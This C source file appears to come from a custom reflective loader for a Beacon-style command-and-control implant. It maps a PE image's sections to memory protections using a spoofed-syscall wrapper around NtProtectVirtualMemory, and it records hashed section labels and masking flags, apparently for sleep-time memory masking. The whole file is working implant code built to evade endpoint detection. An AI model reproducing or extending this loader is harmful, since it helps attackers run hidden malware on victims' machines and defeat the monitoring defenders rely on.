#include "Macros.h"
#include "Instance.h"
#include "Common.h"
#include "BeaconUserData.h"
#include "PreHash.h"

D_SEC(B) 
ALLOCATED_MEMORY_LABEL GetSectionLabel(
	_In_	LPSTR	lpSectionName
	)
{

    switch (HashStringA((LPCSTR)lpSectionName))
    {
    case HASH_TEXT:
        return LABEL_TEXT;

    case HASH_RDATA:
        return LABEL_RDATA;

    case HASH_DATA:
        return LABEL_DATA;

    case HASH_PDATA:
        return LABEL_PDATA;

    case HASH_RELOC:
        return LABEL_RELOC;

    default:
        return LABEL_EMPTY;
    }
}

D_SEC(B)
BOOL PatchMemoryProtection(
	_In_	PVOID					pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS		pNtHeader,
    _In_    PINSTANCE               Inst,
	_Inout_	PALLOCATED_MEMORY		allocatedMemory
    )
{

	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);
    NTSTATUS    status = 0;

	for (DWORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
	{
		PVOID       pSectionAddr = (PVOID)(U_PTR(pMemPeAddr) + pSecHeader[i].VirtualAddress);
		SIZE_T	    sectionSize		= pSecHeader[i].SizeOfRawData;
		DWORD	    dwMemProtect	= 0;
		ULONG_PTR	oldProtect	= 0;

		if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwMemProtect = PAGE_WRITECOPY;

		if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwMemProtect = PAGE_READONLY;

		if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwMemProtect = PAGE_READWRITE;

		if (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwMemProtect = PAGE_EXECUTE;

		if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwMemProtect = PAGE_EXECUTE_WRITECOPY;

		if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwMemProtect = PAGE_EXECUTE_READ;

		if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwMemProtect = PAGE_EXECUTE_READWRITE;

        status = SPOOF_SYSCALL(NtProtectVirtualMemory, 
			NtCurrentProcess, &pSectionAddr, &sectionSize, dwMemProtect, &oldProtect);

        if (!NT_SUCCESS(status))
        {
            return FALSE;
        }

		ALLOCATED_MEMORY_LABEL memLabel = GetSectionLabel(pSecHeader[i].Name);
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].Label = memLabel;
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].BaseAddress = pSectionAddr;
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].VirtualSize = sectionSize;
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].CurrentProtect = dwMemProtect;	
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].PreviousProtect = PAGE_READWRITE;
		allocatedMemory->AllocatedMemoryRegions[0].Sections[i].MaskSection = MASK_TRUE;

    }
	return TRUE;	
}